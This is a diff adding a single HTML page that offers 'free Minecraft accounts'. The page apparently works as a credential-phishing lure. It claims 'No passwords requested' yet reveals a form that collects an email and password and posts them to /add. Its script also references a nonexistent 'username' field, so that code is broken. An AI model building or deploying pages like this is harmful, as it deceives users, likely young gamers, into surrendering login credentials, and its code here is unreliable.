@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Free Minecraft Accounts</title>
+<style>
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(180deg, #0b1220, #061016);
+    color: #fff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+    justify-content: center;
+    padding: 20px;
+  }
+  h1 { font-size: 2em; margin-bottom: 10px; text-align: center; }
+  p { color: #aaa; text-align: center; margin-bottom: 20px; }
+
+  .btn {
+    background: #56c870;
+    color: #072034;
+    padding: 12px 24px;
+    font-weight: bold;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 1em;
+    transition: 0.2s;
+  }
+  .btn:hover { background: #2db85a; }
+
+  .signup {
+    display: none;
+    background: #0f1b2a;
+    padding: 20px;
+    border-radius: 12px;
+    margin-top: 20px;
+    width: 100%;
+    max-width: 400px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+  }
+  .signup h2 { margin-top: 0; text-align: center; }
+  .signup input {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 12px;
+    border-radius: 8px;
+    border: 1px solid #333;
+    background: #061016;
+    color: #fff;
+  }
+  .signup button {
+    width: 100%;
+  }
+
+</style>
+</head>
+<body>
+
+<h1>Get Your Free Minecraft Account</h1>
+<p>Claim your account safely. No passwords requested.</p>
+<button class="btn" id="getAccountBtn">Get Free Minecraft Account</button>
+
+<div class="signup" id="signupForm">
+  <h2>Sign Up to Claim</h2>
+  <form action="/add" method="post">
+    <input name="email" type="email" placeholder="Email" id="email" required>
+    <input name="password" type="password" placeholder="Password" id="password" required>
+    <button class="btn" id="signupBtn">Sign Up</button>
+  </form>
+</div>
+
+<script>
+  const getBtn = document.getElementById('getAccountBtn');
+  const signup = document.getElementById('signupForm');
+
+  getBtn.addEventListener('click', () => {
+    signup.style.display = 'block';
+    signup.scrollIntoView({ behavior: 'smooth', block: 'center' });
+  });
+
+  document.getElementById('signupBtn').addEventListener('click', () => {
+    const user = document.getElementById('username').value;
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('password').value;
+
+    if(!user || !email || !pass){
+      alert('Please fill all fields!');
+      return;
+    }
+    alert(`Thanks ${user}! Your free Minecraft account will be sent to ${email}.`);
+    // clear form
+    document.getElementById('username').value = '';
+    document.getElementById('email').value = '';
+    document.getElementById('password').value = '';
+  });
+</script>
+
+</body>
+</html>
